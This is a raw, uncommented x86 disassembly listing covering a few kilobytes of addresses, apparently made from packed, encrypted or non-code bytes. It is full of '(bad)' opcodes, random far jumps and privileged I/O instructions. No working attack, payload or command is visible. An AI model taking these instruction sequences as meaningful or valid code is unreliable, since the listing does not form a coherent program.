  418dec:	jmp    0xa8dc:0x6e425008
  418df3:	push   es
  418df4:	test   eax,0xa24186e6
  418df9:	cmp    eax,0x9bdd68eb
  418dfe:	mov    edi,0x1915fbe6
  418e03:	pop    DWORD PTR [ebx-0x19]
  418e06:	xor    bh,BYTE PTR [eax+esi*1+0x56]
  418e0a:	xchg   ebp,eax
  418e0b:	adc    ah,ah
  418e0d:	das    
  418e0e:	retf   
  418e0f:	sub    ecx,edx
  418e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e12:	adc    BYTE PTR [edi+ecx*1-0x6aaacfac],ch
  418e19:	dec    ecx
  418e1a:	ins    DWORD PTR es:[edi],dx
  418e1b:	mov    bh,0xe7
  418e1d:	clc    
  418e1e:	and    al,0xf7
  418e20:	mov    ecx,0x2d4a1970
  418e25:	and    al,0xa8
  418e27:	inc    ebx
  418e28:	rcl    eax,1
  418e2a:	mov    al,0x82
  418e2c:	dec    ebx
  418e2d:	outs   dx,BYTE PTR ds:[esi]
  418e2e:	or     cl,0x8f
  418e31:	jbe    0x418e85
  418e33:	xor    al,0x6d
  418e35:	push   0xfffffff6
  418e37:	cmp    eax,0xb664345d
  418e3c:	push   ebp
  418e3d:	mov    ebp,DWORD PTR es:[ecx+ebp*2+0x2b]
  418e42:	outs   dx,DWORD PTR ds:[esi]
  418e43:	add    ebx,ebp
  418e45:	cli    
  418e46:	cs and edi,edi
  418e49:	mov    ah,BYTE PTR [edx-0x68]
  418e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e4d:	add    BYTE PTR [ebp+0x8],0x75
  418e51:	sar    al,0xc2
  418e54:	inc    eax
  418e55:	inc    edi
  418e56:	pop    esp
  418e57:	jno    0x418ebf
  418e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e5a:	mov    edi,0x3c15e99
  418e5f:	pop    edi
  418e60:	push   0xffffffbd
  418e62:	add    ebx,eax
  418e64:	pop    ebx
  418e65:	push   esi
  418e66:	shr    al,0x3a
  418e69:	xchg   ecx,eax
  418e6a:	imul   edi,edi,0xffffffc3
  418e6d:	jno    0x418e26
  418e6f:	adc    al,0xba
  418e71:	cmp    esi,DWORD PTR [eax-0x15864d7a]
  418e77:	loope  0x418e58
  418e79:	push   edx
  418e7a:	sbb    esp,DWORD PTR [eax+edx*2+0x331ca509]
  418e81:	inc    ecx
  418e82:	and    al,0xd3
  418e84:	call   0xc029:0x5669d77c
  418e8b:	or     BYTE PTR [ebx-0xdb574c5],dh
  418e91:	jmp    0x3365aeff
  418e96:	push   0x7d
  418e98:	std    
  418e99:	xor    al,0x77
  418e9b:	cmc    
  418e9c:	or     DWORD PTR [edi-0x72],ebp
  418e9f:	xchg   ecx,eax
  418ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ea1:	jmp    0xc946197f
  418ea6:	jp     0x418e7a
  418ea8:	xor    al,BYTE PTR [ebp-0x5fc515]
  418eae:	(bad)  
  418eaf:	adc    DWORD PTR [ebx-0x3b],ebx
  418eb2:	lea    edx,[edx]
  418eb4:	push   ds
  418eb5:	mov    ss,WORD PTR [eax-0x2f40f159]
  418ebb:	cdq    
  418ebc:	dec    ebp
  418ebd:	por    mm7,QWORD PTR [ebx+0x53fef4a5]
  418ec4:	icebp  
  418ec5:	sbb    al,0x6d
  418ec7:	jmp    0x418ef6
  418ec9:	int3   
  418eca:	test   BYTE PTR [ebp-0x79405499],bh
  418ed0:	mov    ecx,0x6def474c
  418ed5:	sbb    bh,al
  418ed7:	gs jns 0x418e5c
  418eda:	inc    ebx
  418edb:	xor    eax,0x957817c9
  418ee0:	jge    0x418f2f
  418ee2:	(bad)  
  418ee3:	call   FWORD PTR [edi-0x4c]
  418ee6:	imul   edi,DWORD PTR [eax+ebx*4+0x419e3422],0x4c
  418eee:	sub    esi,DWORD PTR [esi+0x55f857d1]
  418ef4:	stos   DWORD PTR es:[edi],eax
  418ef5:	sar    BYTE PTR [edx-0x42],0xd8
  418ef9:	xchg   esi,eax
  418efa:	bound  ebx,QWORD PTR [eax]
  418efc:	push   0x4c
  418efe:	push   edi
  418eff:	add    ah,BYTE PTR [edi+0xb8c8b09]
  418f05:	pop    esp
  418f06:	adc    BYTE PTR [esi+0x31],ch
  418f09:	jmp    0xa062b39b
  418f0e:	jmp    FWORD PTR [eax]
  418f10:	pop    esp
  418f11:	and    eax,0xa73d93e6
  418f16:	sbb    BYTE PTR [eax-0x1751b187],0xae
  418f1d:	push   ecx
  418f1e:	xor    BYTE PTR [edx],0xc6
  418f21:	mov    WORD PTR [esi],ss
  418f23:	and    DWORD PTR [ecx],esp
  418f25:	hlt    
  418f26:	sbb    al,0x70
  418f28:	and    BYTE PTR [edi+0x297dd6d4],dl
  418f2e:	imul   esp,DWORD PTR ds:0xbdf7068d,0x46
  418f35:	cmp    DWORD PTR [edx],edx
  418f37:	into   
  418f38:	(bad)  
  418f39:	mov    edi,0xad6a3f0
  418f3e:	jno    0x418f22
  418f40:	test   DWORD PTR [ebx+ebx*2-0x44],ecx
  418f44:	pop    esi
  418f45:	cmp    esi,DWORD PTR [ebx+ebx*1-0x55]
  418f49:	mov    ah,0x15
  418f4b:	dec    edi
  418f4c:	imul   edi,DWORD PTR [esp+ebp*8],0xffffffcd
  418f50:	jns    0x418f7d
  418f52:	sbb    esi,DWORD PTR [ebx+0x4eeedfea]
  418f58:	in     eax,0xee
  418f5a:	jmp    0x5aa87510
  418f5f:	gs pop ebx
  418f61:	(bad)  
  418f62:	sahf   
  418f63:	daa    
  418f64:	add    BYTE PTR [esi],bh
  418f66:	push   0xb5e6bffb
  418f6b:	mov    ds:0xb071aa87,al
  418f70:	jp     0x418f6e
  418f72:	out    0x39,eax
  418f74:	push   edi
  418f75:	pop    esp
  418f76:	int3   
  418f77:	(bad)  
  418f79:	icebp  
  418f7a:	jmp    0x6ea1:0x7e188409
  418f81:	jle    0x418f69
  418f83:	into   
  418f84:	rcl    DWORD PTR [edi-0x60],1
  418f87:	add    bl,BYTE PTR [ebx-0x44]
  418f8a:	outs   dx,BYTE PTR ds:[esi]
  418f8b:	stos   BYTE PTR es:[edi],al
  418f8c:	jns    0x418f53
  418f8e:	xor    esp,DWORD PTR [edi-0x41]
  418f91:	fsub   DWORD PTR [ebx+0x7ad4182]
  418f97:	test   eax,0x13f93eb0
  418f9c:	and    dh,BYTE PTR [edx-0x3f]
  418f9f:	ret    
  418fa0:	rcr    bl,1
  418fa2:	inc    esp
  418fa3:	xchg   edi,eax
  418fa4:	imul   esp,DWORD PTR [ecx-0x4a],0x59f57b5a
  418fab:	scas   al,BYTE PTR es:[edi]
  418fac:	add    DWORD PTR [eax-0x7506998b],0xb
  418fb3:	sbb    BYTE PTR [edx-0x61],cl
  418fb6:	push   cs
  418fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb8:	ins    DWORD PTR es:[edi],dx
  418fb9:	or     al,0x5e
  418fbb:	mov    ebp,0xa752fbfc
  418fc0:	sbb    BYTE PTR [edx-0x69],0x35
  418fc4:	ja     0x41901a
  418fc6:	retf   
  418fc7:	push   ebx
  418fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc9:	in     al,dx
  418fca:	dec    esp
  418fcb:	aam    0x6d
  418fcd:	jle    0x419001
  418fcf:	stc    
  418fd0:	and    eax,DWORD PTR [edx+0xa]
  418fd3:	xor    DWORD PTR [ebp+0x10],edi
  418fd6:	sbb    esi,DWORD PTR [ebp-0x63552d8d]
  418fdc:	or     al,0x9e
  418fde:	aas    
  418fdf:	jbe    0x418fa0
  418fe1:	xchg   esi,eax
  418fe2:	sbb    BYTE PTR ds:0x48cfc870,0xe8
  418fe9:	(bad)
  418fed:	jp     0x418fde
  418fef:	xchg   esp,eax
  418ff0:	mov    cs,WORD PTR [edi+eax*1]
  418ff3:	push   ebp
  418ff4:	cli    
  418ff5:	call   0xc7f5:0x19fcb845
  418ffc:	lds    esi,FWORD PTR [edi]
  418ffe:	inc    eax
  418fff:	add    esi,DWORD PTR [esi-0x2b]
  419002:	and    al,0xd9
  419004:	jp     0x419027
  419006:	push   es
  419007:	rcr    BYTE PTR [ebx+0x2d7174eb],cl
  41900d:	sti    
  41900e:	or     BYTE PTR [ebx+0x28],ah
  419011:	mov    dh,0x8
  419013:	dec    edx
  419014:	and    al,bh
  419016:	out    0x38,al
  419018:	dec    edx
  419019:	add    dl,ch
  41901b:	inc    esp
  41901c:	ds je  0x419041
  41901f:	in     eax,dx
  419020:	daa    
  419021:	iret   
  419022:	mov    ds:0x404f1425,eax
  419027:	sub    eax,0x3f8e8f80
  41902c:	les    esp,FWORD PTR [edi+edi*8-0x6f]
  419030:	pop    edi
  419031:	pop    edi
  419032:	xor    eax,0x8c5772b5
  419037:	std    
  419038:	inc    ebp
  419039:	lods   al,BYTE PTR ds:[esi]
  41903a:	fwait
  41903b:	bound  ebp,QWORD PTR [edi]
  41903d:	fdivr  QWORD PTR [esi-0x55]
  419040:	and    eax,0x11e7278a
  419045:	push   eax
  419046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419047:	clc    
  419048:	mov    ds:0x87b1552,al
  41904d:	push   esi
  41904e:	(bad)  
  41904f:	mul    DWORD PTR [esi]
  419051:	dec    edi
  419052:	in     eax,0xe5
  419054:	loop   0x419078
  419056:	sub    eax,0xe1d0c6ae
  41905b:	adc    bl,BYTE PTR [esi]
  41905d:	sbb    al,0x21
  41905f:	and    BYTE PTR [edi-0x62],bh
  419062:	std    
  419063:	push   es
  419064:	xchg   ebp,eax
  419065:	push   esp
  419066:	das    
  419067:	add    BYTE PTR ds:0x49307c94,ch
  41906d:	mov    ds:0x25bc7efa,eax
  419072:	sbb    eax,0x252de66b
  419077:	ins    DWORD PTR es:[edi],dx
  419078:	mov    ds:0x4a282987,al
  41907d:	add    eax,0x7d10cb55
  419082:	ss in  al,0x78
  419085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419086:	cmp    BYTE PTR [ebx],bl
  419088:	scas   al,BYTE PTR es:[edi]
  419089:	mov    edx,DWORD PTR [edi-0x1d3f9642]
  41908f:	push   cs
  419090:	or     ah,BYTE PTR [ebx]
  419092:	fs dec ecx
  419094:	jecxz  0x41910e
  419096:	in     al,0x2c
  419098:	sbb    eax,0x61ee9c25
  41909d:	ret    0x50bd
  4190a0:	xchg   dl,dl
  4190a2:	and    cl,BYTE PTR [ecx-0x26]
  4190a5:	or     eax,0x11e6439a
  4190aa:	xor    DWORD PTR [ecx+ebx*8-0x66],esi
  4190ae:	push   0x3f0ea623
  4190b3:	inc    DWORD PTR [ebp+0x1e1db2e7]
  4190b9:	adc    BYTE PTR [edx-0x11],0xfe
  4190bd:	jg     0x4190ba
  4190bf:	mov    ds:0xd9d18010,al
  4190c4:	jbe    0x419113
  4190c6:	mov    bh,0x46
  4190c8:	pop    edx
  4190c9:	adc    al,0x5d
  4190cb:	pop    ebp
  4190cc:	sbb    al,0x40
  4190ce:	xchg   DWORD PTR [esp+eax*8+0x10],ebx
  4190d2:	jecxz  0x4190c2
  4190d4:	jle    0x419064
  4190d6:	mov    eax,0x84864946
  4190db:	das    
  4190dc:	enter  0xaf69,0xfe
  4190e0:	add    eax,0xf261c35f
  4190e5:	jmp    0xef62b298
  4190ea:	imul   edi,DWORD PTR [eax-0x38],0x60
  4190ee:	xchg   esi,eax
  4190ef:	adc    DWORD PTR [esi-0x266cb5e0],eax
  4190f5:	inc    eax
  4190f6:	xor    cl,BYTE PTR [edx+eax*8]
  4190f9:	push   ds
  4190fa:	pop    eax
  4190fb:	mov    ds:0xb0cc8aa2,eax
  419100:	jbe    0x4190be
  419102:	jmp    0x419172
  419104:	jae    0x419147
  419106:	je     0x41913c
  419108:	loopne 0x4190b1
  41910a:	mov    al,0x1
  41910c:	je     0x41917d
  41910e:	adc    eax,0xf1d9b369
  419113:	xchg   esi,eax
  419114:	mov    bp,0x804c
  419118:	pushf  
  419119:	cmc    
  41911a:	cmp    BYTE PTR [ebx],0xd8
  41911d:	push   cs
  41911e:	adc    ah,BYTE PTR [ebx]
  419120:	mul    DWORD PTR ds:0x6b1a46a6
  419126:	fwait
  419127:	lahf   
  419128:	jns    0x419178
  41912a:	psubq  xmm4,XMMWORD PTR [edx]
  41912e:	test   al,0xc8
  419130:	or     eax,0x37a4f4c9
  419135:	mov    esi,0xc1f3c639
  41913a:	dec    ebx
  41913b:	xchg   edx,eax
  41913c:	mov    dh,0xdb
  41913e:	and    ebp,DWORD PTR [ebx]
  419140:	or     esi,DWORD PTR ds:0x8717074e
  419146:	sbb    DWORD PTR [ebx],0x493e057a
  41914c:	and    DWORD PTR [edi+0x1c552553],ebp
  419152:	inc    esp
  419153:	ins    BYTE PTR es:[edi],dx
  419154:	lds    ebp,FWORD PTR [edx+0x4416bddc]
  41915a:	mov    ah,0x36
  41915c:	scas   eax,DWORD PTR es:[edi]
  41915d:	iret   
  41915e:	inc    ebx
  41915f:	cmp    edi,ecx
  419161:	shr    DWORD PTR [eax+0x2f9164d4],0xa1
  419168:	mov    al,0x53
  41916a:	jmp    0x902d38eb
  41916f:	mov    al,0x6d
  419171:	repz mov bl,0x85
  419174:	pusha  
  419175:	dec    esi
  419176:	int    0xc7
  419178:	lahf   
  419179:	cs jle 0x419153
  41917c:	ror    cl,0xd1
  41917f:	ffree  st(2)
  419181:	xchg   DWORD PTR [esi+0x2b],esi
  419184:	shr    BYTE PTR [esi-0x99fdb69],1
  41918a:	xchg   esi,eax
  41918b:	jecxz  0x419181
  41918d:	add    BYTE PTR [esi-0x3898d000],cl
  419193:	inc    esp
  419194:	(bad)  
  419196:	jne    0x41917f
  419198:	ror    BYTE PTR [ecx+ebx*2],0x9b
  41919c:	xchg   esp,eax
  41919d:	pop    ds
  41919e:	mov    ds:0x452cc64d,eax
  4191a3:	or     al,0x6e
  4191a5:	popa   
  4191a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191a7:	ficom  WORD PTR [ebx+0x6a]
  4191aa:	sub    al,0x81
  4191ac:	adc    edx,DWORD PTR [esi-0x3]
  4191af:	jne    0x4191a9
  4191b1:	lahf   
  4191b2:	jmp    0xf9ee:0x7eed3526
  4191b9:	dec    edx
  4191ba:	xchg   BYTE PTR [edi],al
  4191bc:	(bad)  
  4191bd:	sub    eax,0x7607a654
  4191c2:	dec    edx
  4191c3:	ins    BYTE PTR es:[edi],dx
  4191c4:	inc    edx
  4191c5:	ret    0xac7c
  4191c8:	icebp  
  4191c9:	push   esp
  4191ca:	push   0x6afd87fb
  4191cf:	dec    eax
  4191d0:	jmp    0x16590f5a
  4191d5:	dec    esp
  4191d6:	xchg   ebp,eax
  4191d7:	inc    esi
  4191d8:	adc    eax,0xdc8ca568
  4191dd:	xor    dl,BYTE PTR [eax-0x2c1a37f9]
  4191e3:	cli    
  4191e4:	jle    0x4191a1
  4191e6:	xchg   ebx,eax
  4191e7:	mov    edx,0x1e2f2116
  4191ec:	outs   dx,DWORD PTR ds:[esi]
  4191ed:	mov    esp,0xc7c13772
  4191f2:	mov    DWORD PTR [ebp+0x71ec0fa2],edi
  4191f8:	std    
  4191f9:	jle    0x419267
  4191fb:	into   
  4191fc:	dec    esi
  4191fd:	jg     0x4191c8
  4191ff:	cmp    ebx,DWORD PTR [ecx+0x50]
  419202:	mov    esp,0x14807444
  419207:	dec    eax
  419208:	jnp    0x41919a
  41920a:	mov    esi,0x3efc20f
  41920f:	xchg   DWORD PTR [ebp+0x67],esi
  419212:	dec    edx
  419213:	iret   
  419214:	(bad)  [ebx]
  419216:	and    BYTE PTR [ecx+eax*2-0x72b51c83],dh
  41921d:	shl    DWORD PTR [ebx+0x5a],cl
  419220:	mov    eax,0x10e58739
  419225:	ror    DWORD PTR [esi],1
  419227:	xor    BYTE PTR [eax],cl
  419229:	or     eax,eax
  41922b:	scas   eax,DWORD PTR es:[edi]
  41922c:	fld    DWORD PTR [ebp+0x549ef81c]
  419232:	pusha  
  419233:	iret   
  419234:	jl     0x4191f6
  419236:	ja     0x419270
  419238:	xchg   edi,eax
  419239:	and    bl,BYTE PTR [ebp+0x12d8c554]
  41923f:	std    
  419240:	xor    eax,0xb47b8dcb
  419245:	xor    ebx,edi
  419247:	or     DWORD PTR [esi-0x316ac437],0xffffffa1
  41924e:	aad    0x7a
  419250:	div    BYTE PTR ds:0x56e6e531
  419256:	sbb    edi,DWORD PTR [ebx]
  419258:	sahf   
  419259:	imul   ebx,DWORD PTR [ecx+eax*1+0x2f],0x72
  41925e:	add    ecx,edi
  419260:	cwde   
  419261:	(bad)  
  419262:	sub    esi,ecx
  419264:	push   edi
  419265:	dec    esi
  419266:	sub    dh,BYTE PTR [esi-0x5e]
  419269:	and    al,0x1
  41926b:	aas    
  41926c:	je     0x41920b
  41926e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41926f:	aas    
  419270:	push   esi
  419271:	daa    
  419272:	scas   eax,DWORD PTR es:[edi]
  419273:	(bad)  
  419274:	fiadd  DWORD PTR [edx]
  419276:	or     DWORD PTR [esi*2+0x40a6d90e],esp
  41927d:	mov    cl,0x7b
  41927f:	(bad)  
  419280:	jo     0x4192ef
  419282:	mov    ebx,esp
  419284:	mov    esp,0xf3cbc5b5
  419289:	xchg   esi,eax
  41928a:	fcomip st,st(1)
  41928c:	push   ebp
  41928d:	(bad)  
  41928e:	push   eax
  41928f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419290:	aaa    
  419291:	pop    ds
  419292:	cmp    ebx,DWORD PTR [ecx-0x5d]
  419295:	pop    esi
  419296:	enter  0x4393,0xc9
  41929a:	xor    DWORD PTR [esi+0x1f],ebp
  41929d:	pop    eax
  41929e:	or     al,0xad
  4192a1:	mov    edx,0x71e3f1db
  4192a6:	out    dx,al
  4192a7:	test   DWORD PTR ds:[ebp+0x1a],esp
  4192ab:	jae    0x419298
  4192ad:	inc    ecx
  4192ae:	mov    dh,0xfd
  4192b0:	xchg   DWORD PTR [eax-0x48],esi
  4192b3:	out    dx,al
  4192b4:	nop
  4192b5:	sti    
  4192b6:	mov    ebp,0xe4f6f19
  4192bb:	fnstcw WORD PTR [esi-0x1]
  4192be:	xchg   ebp,eax
  4192bf:	and    eax,0xb9d0a8f6
  4192c4:	mov    ecx,0x38d00d30
  4192c9:	or     eax,0x13250604
  4192ce:	xchg   ebx,eax
  4192cf:	je     0x4192c9
  4192d1:	inc    esi
  4192d2:	nop
  4192d3:	call   0x10c0c355
  4192d8:	(bad)  
  4192d9:	sbb    al,0xc1
  4192db:	(bad)  
  4192dc:	jp     0x419320
  4192de:	aam    0x53
  4192e0:	repz cmp DWORD PTR [esi-0x68],ebx
  4192e4:	cli    
  4192e5:	inc    esp
  4192e6:	push   ebx
  4192e7:	dec    esp
  4192e8:	jns    0x419341
  4192ea:	jae    0x4192fc
  4192ec:	das    
  4192ed:	in     eax,0xcb
  4192ef:	into   
  4192f0:	or     cl,BYTE PTR [edi-0x15]
  4192f3:	push   ebp
  4192f4:	fwait
  4192f5:	push   edx
  4192f6:	or     eax,0xe171c60f
  4192fb:	pop    esp
  4192fc:	leave  
  4192fd:	push   0xffffffb0
  4192ff:	imul   ecx,DWORD PTR ds:0x804407e,0x7c148986
  419309:	lahf   
  41930a:	mov    ch,0xda
  41930c:	in     eax,dx
  41930d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41930e:	mov    ebx,0xa73bdd66
  419313:	push   ebx
  419314:	jo     0x419371
  419316:	cmp    eax,ebp
  419318:	xchg   esp,eax
  419319:	in     al,0x49
  41931b:	lahf   
  41931c:	fldenv [ecx]
  41931e:	cwde   
  41931f:	adc    ebp,DWORD PTR [ebp-0x54]
  419322:	mov    ?,ebx
  419324:	imul   DWORD PTR [eax]
  419326:	loop   0x4192a8
  419328:	add    dl,BYTE PTR [edx-0x6c969a3a]
  41932e:	push   ecx
  41932f:	test   eax,0x734686e5
  419335:	fldcw  WORD PTR [ebx+ecx*8]
  419338:	inc    ecx
  419339:	inc    ebp
  41933a:	int3   
  41933b:	clc    
  41933c:	std    
  41933d:	daa    
  41933e:	push   ebx
  41933f:	clc    
  419340:	pushf  
  419341:	xchg   edx,eax
  419342:	push   ebp
  419343:	lods   al,BYTE PTR ds:[esi]
  419344:	and    esi,DWORD PTR ds:0xb3e44e02
  41934a:	xchg   esi,eax
  41934b:	es loope 0x419386
  41934e:	mov    ebx,ebx
  419350:	add    ecx,DWORD PTR [ebx+0x4068fa3]
  419356:	inc    ebp
  419357:	cld    
  419358:	dec    eax
  419359:	pop    esp
  41935a:	cmp    dh,ah
  41935c:	dec    eax
  41935d:	and    edx,DWORD PTR [edi-0x5]
  419360:	mov    esi,0xaf8acbc6
  419365:	and    eax,eax
  419367:	xor    esi,DWORD PTR [esp-0x536299a3]
  41936e:	mov    ebp,0x665498e0
  419373:	fwait
  419374:	repnz add DWORD PTR [esi],0xb838de6f
  41937b:	in     al,dx
  41937c:	sbb    eax,0x9f997300
  419381:	(bad)  
  419382:	sub    edx,esi
  419384:	pop    eax
  419385:	push   esi
  419386:	fwait
  419387:	enter  0x876,0xa2
  41938b:	cmp    DWORD PTR [esi],ebp
  41938d:	push   edx
  41938e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41938f:	dec    ebx
  419390:	aas    
  419391:	mov    ?,WORD PTR [esp+edx*2+0xe2470ad]
  419398:	arpl   WORD PTR [eax-0x2b],bp
  41939b:	out    dx,al
  41939c:	shl    BYTE PTR [ebp+ebp*1-0x42],1
  4193a0:	(bad)  [ecx+eax*8]
  4193a3:	or     BYTE PTR [ebp+ebp*1+0xdd2afa2],bh
  4193aa:	pop    ecx
  4193ab:	cmp    BYTE PTR fs:[edx+eax*1],0xd3
  4193b0:	cli    
  4193b1:	push   ss
  4193b2:	pop    eax
  4193b3:	out    dx,eax
  4193b4:	ret    0xc1a1
  4193b7:	bound  edi,QWORD PTR [ebp+0x3b93e024]
  4193bd:	xchg   DWORD PTR [edx-0x9],ebx
  4193c0:	pop    ds
  4193c1:	or     eax,0xa3e3b2c6
  4193c6:	mov    ebp,0xa0934d0a
  4193cb:	push   esp
  4193cc:	test   DWORD PTR [ecx+ebx*1],0xdb2a7ce5
  4193d3:	sbb    al,0x57
  4193d5:	inc    eax
  4193d6:	mov    al,ds:0x60054754
  4193db:	fidiv  DWORD PTR [edi-0x68]
  4193de:	(bad)  
  4193e0:	rcl    esp,0xad
  4193e3:	cmp    BYTE PTR [esi-0x31ad564d],bh
  4193e9:	jmp    DWORD PTR [edi+esi*8+0x7d]
  4193ed:	pop    ebx
  4193ee:	ret    
  4193ef:	pop    ecx
  4193f0:	jo     0x4193d1
  4193f2:	mov    edi,?
  4193f4:	pop    esp
  4193f5:	jecxz  0x419468
  4193f7:	fs mov esi,0xa4d67a81
  4193fd:	aad    0x89
  4193ff:	sub    BYTE PTR [esi],0xa
  419402:	sbb    bh,0x9f
  419405:	add    cl,0x58
  419408:	xchg   ebp,eax
  419409:	xchg   BYTE PTR [eax+ebp*8-0x449f11bb],dh
  419410:	push   0xffffffaf
  419412:	dec    ecx
  419413:	mov    ecx,0xc699834c
  419418:	inc    edi
  419419:	in     al,0x2a
  41941b:	push   cs
  41941c:	scas   eax,DWORD PTR es:[edi]
  41941d:	ss pop edx
  41941f:	inc    esp
  419420:	je     0x41944a
  419422:	stos   DWORD PTR es:[edi],eax
  419423:	test   DWORD PTR [ecx-0x5e],ebx
  419426:	push   0xa2b810cf
  41942b:	in     al,dx
  41942c:	scas   eax,DWORD PTR es:[edi]
  41942d:	nop
  41942e:	mov    ebp,0x70635232
  419433:	in     al,0xd3
  419435:	pop    edx
  419436:	or     BYTE PTR [edi],cl
  419438:	imul   edi,ebp,0xbaebb126
  41943e:	(bad)
  419441:	mov    bh,BYTE PTR [edi]
  419443:	call   0xe4cf3d70
  419448:	lds    ecx,FWORD PTR [edx]
  41944a:	jmp    0x67132235
  41944f:	daa    
  419450:	adc    al,0xa3
  419452:	call   0x868dc553
  419457:	mov    ebp,0xef2a2ead
  41945c:	xchg   DWORD PTR [eax-0x496a2f04],ebx
  419462:	mov    ebx,0xa1c79909
  419467:	dec    esi
  419468:	jg     0x41944d
  41946a:	retf   
  41946b:	stos   BYTE PTR es:[edi],al
  41946c:	fadd   QWORD PTR [ebp+eax*1+0x767293c6]
  419473:	call   esi
  419475:	retf   0xd5c4
  419478:	jl     0x419435
  41947a:	inc    eax
  41947b:	pop    eax
  41947c:	mov    DWORD PTR [ebx+0x76],ecx
  41947f:	or     DWORD PTR [edx+0x838ce3a],ebp
  419485:	mov    BYTE PTR [esi-0x5d813c17],dh
  41948b:	cmp    eax,0x33a202fd
  419490:	retf   
  419491:	mov    cl,0x37
  419493:	call   0x9ed05f6e
  419498:	sbb    al,0x53
  41949a:	jne    0x419510
  41949c:	ja     0x4194a6
  41949e:	out    0xf8,al
  4194a0:	into   
  4194a1:	dec    edx
  4194a2:	(bad)  
  4194a4:	mov    dl,0x54
  4194a6:	pop    ecx
  4194a7:	cmp    bh,BYTE PTR [edi-0x18156728]
  4194ad:	fldenv [esi+edi*4-0xacc59b7]
  4194b4:	ins    BYTE PTR es:[edi],dx
  4194b5:	cmp    BYTE PTR [edi+ebp*2+0x4f],dh
  4194b9:	out    dx,eax
  4194ba:	aaa    
  4194bb:	pop    eax
  4194bc:	ret    0xf52f
  4194bf:	and    ebx,ecx
  4194c1:	cmovns edx,DWORD PTR [eax-0x36661054]
  4194c8:	push   0xffffffc3
  4194ca:	or     ecx,DWORD PTR ds:0xeed987b3
  4194d0:	aam    0x1d
  4194d2:	adc    ah,cl
  4194d4:	into   
  4194d5:	cmp    al,0x79
  4194d7:	sbb    BYTE PTR [edx+0x178bcdda],cl
  4194dd:	and    cl,BYTE PTR [esi]
  4194df:	cli    
  4194e0:	clc    
  4194e1:	dec    esi
  4194e2:	add    eax,0x4071bf6d
  4194e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194e8:	repz test BYTE PTR [ecx-0xbf51f30],ah
  4194ef:	and    al,0xa9
  4194f1:	xor    eax,0xa0ce3d88
  4194f6:	daa    
  4194f7:	out    dx,al
  4194f8:	xchg   edi,eax
  4194f9:	jns    0x41953c
  4194fb:	mov    ah,bh
  4194fd:	retf   0x3a84
  419500:	mov    esi,0x3389b6b3
  419505:	inc    esp
  419506:	mov    cl,0x53
  419508:	jle    0x41949a
  41950a:	push   ecx
  41950b:	hlt    
  41950c:	mov    dh,cl
  41950e:	aam    0xab
  419510:	ds pop es
  419512:	add    BYTE PTR [edx],cl
  419514:	push   esi
  419515:	jle    0x41952f
  419517:	cmp    bh,dh
  419519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41951a:	(bad)  
  41951b:	mov    ebp,0x1ea44018
  419520:	xor    BYTE PTR ds:0xcd9e1d07,ah
  419526:	imul   edx,DWORD PTR [esp+eax*2],0xfffffffb
  41952a:	add    BYTE PTR [ecx],0x65
  41952d:	call   0x53c2b7a0
  419532:	(bad)  
  419533:	jle    0x4194f3
  419535:	popf   
  419536:	out    dx,eax
  419537:	lds    ebp,FWORD PTR [esi-0x32206483]
  41953d:	in     eax,dx
  41953e:	inc    edi
  41953f:	jae    0x4194f1
  419541:	loope  0x41959a
  419543:	cmc    
  419544:	pop    ebx
  419545:	pop    ss
  419546:	push   edi
  419547:	xchg   edi,eax
  419548:	ds mov esp,0x5caf12ec
  41954e:	loopne 0x419529
  419550:	js     0x4194f4
  419552:	sahf   
  419553:	inc    esi
  419554:	je     0x419599
  419556:	test   eax,0x8f1b7785
  41955b:	fst    DWORD PTR [bp+si-0x33bd]
  419560:	fldcw  WORD PTR [ebp+0x4cdb856b]
  419566:	sub    DWORD PTR [ebx-0x342a19aa],0xffffffba
  41956d:	pop    esp
  41956e:	(bad)  
  41956f:	repz mov ds:0xb63135db,al
  419575:	retf   
  419576:	jb     0x41950c
  419578:	sub    ebx,DWORD PTR [ecx]
  41957a:	mov    cl,0x2
  41957c:	inc    edi
  41957d:	aad    0x3a
  41957f:	inc    esi
  419580:	addr16 leave 
  419582:	adc    eax,0x192a0a69
  419587:	test   BYTE PTR [esi],bh
  419589:	int    0x9a
  41958b:	shl    DWORD PTR [ebp-0x41],0xe1
  41958f:	scas   eax,DWORD PTR es:[edi]
  419590:	ins    DWORD PTR es:[edi],dx
  419591:	jnp    0x419549
  419593:	xlat   BYTE PTR ds:[ebx]
  419594:	imul   esp,ebp,0xffffffdf
  419597:	mov    eax,0x486f1d8e
  41959c:	ins    DWORD PTR es:[edi],dx
  41959d:	jne    0x4195b7
  41959f:	mov    ds:0x35591445,eax
  4195a4:	cmp    eax,0x6036595c
  4195a9:	mov    ebx,0xd35db8bd
  4195ae:	sub    al,0x32
  4195b0:	in     eax,dx
  4195b1:	sbb    al,0xcc
  4195b3:	je     0x419602
  4195b5:	(bad)  
  4195b6:	push   eax
  4195b7:	xchg   ebx,eax
  4195b8:	fwait
  4195b9:	xchg   edi,eax
  4195ba:	nop
  4195bb:	adc    bh,bh
  4195bd:	mov    esp,ebx
  4195bf:	imul   edi,esp,0x4f385d5e
  4195c5:	adc    dh,dl
  4195c7:	add    eax,0xf70b11a1
  4195cc:	or     ebp,eax
  4195ce:	ins    BYTE PTR es:[edi],dx
  4195cf:	xor    DWORD PTR [ebp+0x2d],ebp
  4195d2:	stc    
  4195d3:	and    eax,0xdcb2f951
  4195d8:	(bad)  
  4195da:	lods   al,BYTE PTR ds:[esi]
  4195db:	scas   al,BYTE PTR es:[edi]
  4195dc:	(bad)  
  4195dd:	aas    
  4195de:	int    0xe9
  4195e0:	gs in  eax,0xba
